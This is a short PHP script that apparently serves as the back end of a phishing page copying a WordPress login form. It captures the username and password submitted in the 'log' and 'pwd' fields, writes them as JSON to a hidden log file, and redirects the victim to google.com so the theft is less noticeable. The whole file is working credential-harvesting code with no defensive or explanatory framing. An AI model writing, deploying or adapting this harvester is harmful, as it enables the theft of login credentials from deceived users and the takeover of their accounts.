<?php

header('Location: https://google.com');
$data = array('site' => 'Wordpress',
  'user' => $_POST['log'],
  'pass' => $_POST['pwd']);

  $json_data = json_encode($data);

  $f = fopen('../../../logs/info.txt', 'w+');
  fwrite($f, $json_data);
  fclose($f);
exit();
?>